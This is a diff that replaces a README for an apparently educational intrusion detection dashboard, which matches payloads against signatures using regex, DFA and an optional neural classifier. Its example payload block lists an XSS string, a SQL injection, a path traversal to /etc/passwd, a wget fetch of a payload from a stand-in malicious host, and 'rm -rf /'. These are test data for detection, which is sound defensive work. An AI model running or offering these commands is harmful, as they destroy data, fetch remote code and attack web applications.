*** Update File: README.md
@@
-# IDS-using-regex
-A minimal IDS using regex and DFA.
+<div align="center">
+
+# 🛡️ IDS Dashboard — Regex + DFA (FLA) + Optional ANN
+
+Scans packet/log payloads using **regular expressions** and **formal automata** (regex → NFA/DFA) to detect known malicious signatures (XSS, SQLi, traversal, command-exec, etc.).  
+Optional **ANN** (NSL-KDD) flow classifier with layman-friendly explanations.
+
+</div>
+
+---
+
+## ✨ Features
+- **Dual engines:** Regex (Python `re`) and **Formal DFA** (via `pyformlang`)  
+- **Both mode:** High-confidence threats = matched by **both** engines  
+- **Streamlit UI:** Paste payloads / upload logs, highlighted matches, explanations  
+- **Signatures:** `signatures.txt` (extensible from UI), categories & severity in UI  
+- **Optional ANN:** Train once on **NSL-KDD**, predict + explain (top features)  
+- **Benchmark:** Regex vs DFA timing on random payloads (`scripts/bench_regex_vs_dfa.py`)
+
+---
+
+## 📦 Quick Start
+
+> **Tested on Python 3.10/3.11 (Windows/Linux).** For packet sniffing, admin/root may be required.
+
+```bash
+python -m venv venv
+# Windows PowerShell
+.\venv\Scripts\Activate.ps1
+# macOS / Linux
+source venv/bin/activate
+
+pip install --upgrade pip
+pip install -r requirements.txt
+```
+
+### (Optional) Train ANN once
+```bash
+python train_ann_model.py
+```
+This downloads NSL-KDD (no dataset committed), trains a small ANN, and saves:
+```
+model/ann_model.h5
+preprocessors/ohe.pkl
+preprocessors/scaler.pkl
+```
+
+### Launch the UI
+```bash
+streamlit run ui_app.py
+# If streamlit not found:
+# python -m streamlit run ui_app.py
+```
+
+---
+
+## 🧭 How to Use
+1. **Choose mode** in the sidebar: **Regex**, **DFA**, or **Both**.  
+2. **Paste payload** (e.g., raw HTTP/log text) into the big text box.  
+3. Click **Run detection**.  
+4. Review **Regex/DFA matches**, **High-confidence** intersection, and the **highlighted input**.  
+5. Optionally, **add/remove signatures** from the sidebar.  
+6. (Optional) In the ANN section, upload NSL-KDD-formatted rows (no header) to classify and **explain**.
+
+### Example payload (copy/paste)
+```
+GET /search?q=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E HTTP/1.1
+Host: vulnerable-website.com
+User-Agent: curl/7.68.0
+cmd.exe /c dir
+../../etc/passwd
+SELECT * FROM users WHERE id='1' OR '1'='1'
+wget http://malicious.example/payload.sh
+rm -rf / --no-preserve-root
+```
+
+### ANN CSV example (single row; no header, 41 features)
+```
+0,tcp,http,SF,181,5450,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,9,9,0.00,0.00,0.00,0.00,1.00,0.00,0.00,255,254,1.00,0.00,0.99,0.00,0.00,0.00,0.00,0.00
+```
+> You can also use the prepared `test_ann_50.csv` (mixed synthetic rows) if present, or upload rows copied from `KDDTest+.txt` (no header).
+
+---
+
+## 🧠 What’s happening under the hood?
+- **Regex engine:** Python’s `re` scans payloads for signatures; fast and flexible.  
+- **DFA engine:** Regex is converted to **ε-NFA → DFA (minimized)** with `pyformlang`, then `.accepts()` checks sequences. This is robust to some regex engine quirks and aligns with formal language theory.  
+- **Both mode:** If **Regex** and **DFA** agree, it’s flagged as **high-confidence** (🚨).  
+- **ANN (optional):** A small dense network trained on NSL-KDD flow features; the UI can show **top features** driving each prediction in plain English (e.g., “many SYN errors → possible scan/DoS”).
+
+---
+
+## 🧪 Benchmark: Regex vs DFA
+You can run:
+```bash
+python scripts/bench_regex_vs_dfa.py
+```
+This prints timing for N random payloads across Regex/DFA. Feel free to tweak sizes/patterns.
+
+---
+
+## 🗂️ Project Structure
+```
+.
+├─ ui_app.py                  # Streamlit UI
+├─ regex_dfa_matcher.py       # Dual-mode detectors (Regex + DFA) + explanations
+├─ ann_classifier.py          # ANN loader + explainable predictions
+├─ train_ann_model.py         # NSL-KDD downloader + trainer (saves model + preprocessors)
+├─ signatures.txt             # One pattern per line (editable via UI)
+├─ scripts/
+│  └─ bench_regex_vs_dfa.py   # Tiny benchmark harness
+├─ model/                     # (generated) ann_model.h5
+├─ preprocessors/             # (generated) ohe.pkl, scaler.pkl
+├─ logs/                      # alerts.log (if you add logging)
+├─ requirements.txt
+└─ README.md
+```
+
+---
+
+## 🛠️ Troubleshooting
+- **`ANN model/preprocessors not found`**  
+  Run `python train_ann_model.py` first. Confirm files exist under `model/` and `preprocessors/`.
+- **`TypeError: OneHotEncoder(..., sparse=...)`**  
+  Use `sparse_output=False` for scikit-learn ≥ 1.2 (already in our trainer).
+- **TensorFlow import errors**  
+  Ensure you’re inside the virtualenv, then:  
+  `pip install --upgrade "tensorflow>=2.11,<2.21"`
+- **`pyformlang` errors on some patterns**  
+  Some advanced PCRE features aren’t regular; those will still match in Regex mode but may fail to build as DFA. The UI uses **Regex** as fallback.
+
+---
+
+## 🔒 Notes
+- Live packet sniffing (if you add it) needs admin/root privileges.  
+- This project is for **educational/demo** purposes — not a production IDS.
+
+---
+
+## 📜 License
+MIT
+
